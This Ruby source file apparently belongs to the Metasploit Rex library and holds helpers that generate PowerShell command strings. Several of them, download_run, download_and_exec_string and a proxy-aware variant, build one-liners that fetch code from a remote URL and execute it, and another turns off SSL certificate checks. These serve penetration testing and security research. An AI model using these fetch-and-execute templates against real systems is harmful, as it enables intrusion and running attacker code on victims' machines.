# -*- coding: binary -*-

module Rex
module Powershell
  ##
  # Convenience methods for generating Powershell code in Ruby
  ##

  module PshMethods
    #
    # Download file via .NET WebClient
    #
    # @param src [String] URL to the file
    # @param target [String] Location to save the file
    #
    # @return [String] Powershell code to download a file
    def self.download(src, target)
      target ||= '$pwd\\' << src.split('/').last
      %Q^(new-object System.Net.WebClient).DownloadFile('#{src}', '#{target}')^
    end

    #
    # Download file via .NET WebClient and execute it afterwards
    #
    # @param src [String] URL to the file
    # @param target [String] Location to save the file
    #
    # @return [String] Powershell code to download a file
    def self.download_run(src, target)
      target ||= '$pwd\\' << src.split('/').last
      %Q^$z="#{target}"; (new-object System.Net.WebClient).DownloadFile('#{src}', $z); invoke-item $z^
    end

    #
    # Uninstall app, or anything named like app
    #
    # @param app [String] Name of application
    # @param fuzzy [Boolean] Whether to apply a fuzzy match (-like) to
    #   the application name
    #
    # @return [String] Powershell code to uninstall an application
    def self.uninstall(app, fuzzy = true)
      match = fuzzy ? '-like' : '-eq'
      %Q^$app = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name #{match} "#{app}" }; $app.Uninstall()^
    end

    #
    # Create secure string from plaintext
    #
    # @param str [String] String to create as a SecureString
    #
    # @return [String] Powershell code to create a SecureString
    def self.secure_string(str)
      %Q(ConvertTo-SecureString -string '#{str}' -AsPlainText -Force$)
    end

    #
    # Find PID of file lock owner
    #
    # @param filename [String] Filename
    #
    # @return [String] Powershell code to identify the PID of a file
    #   lock owner
    def self.who_locked_file(filename)
      %Q^ Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq "#{filename}"){$processVar.Name + " PID:" + $processVar.id}}}^
    end

    #
    # Return last time of login
    #
    # @param user [String] Username
    #
    # @return [String] Powershell code to return the last time of a user
    #   login
    def self.get_last_login(user)
      %Q^ Get-QADComputer -ComputerRole DomainController | foreach { (Get-QADUser -Service $_.Name -SamAccountName "#{user}").LastLogon} | Measure-Latest^
    end

    #
    # Disable SSL Certificate verification
    #
    # @return [String] Powershell code to disable SSL verification
    #   checks.
    def self.ignore_ssl_certificate
      '[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
    end

    #
    # Download and execute string via HTTP
    #
    # @param url [String] string to download
    # @param iex [Boolean] utilize invoke-expression to execute code
    #
    # @return [String] PowerShell code to download and exec the url
    def self.download_and_exec_string(url, iex = true)
      if iex
        %Q^IEX ((new-object Net.WebClient).DownloadString('#{url}'))^
      else
        %Q^&([scriptblock]::create((new-object Net.WebClient).DownloadString('#{url}')))^
      end
    end

    #
    # Use the default system web proxy and credentials to download a URL
    # as a string and execute the contents as PowerShell
    #
    # @param url [String] string to download
    # @param iex [Boolean] utilize invoke-expression to execute code
    #
    # @return [String] PowerShell code to download a URL
    def self.proxy_aware_download_and_exec_string(url, iex = true)
      var = Rex::Text.rand_text_alpha(1)
      cmd = "$#{var}=new-object net.webclient;"
      cmd << "$#{var}.proxy=[Net.WebRequest]::GetSystemWebProxy();"
      cmd << "$#{var}.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
      if iex
        cmd << "IEX $#{var}.downloadstring('#{url}');"
      else
        cmd << "&([scriptblock]::create($#{var}.downloadstring('#{url}'));"
      end
      cmd
    end
  end
end
end
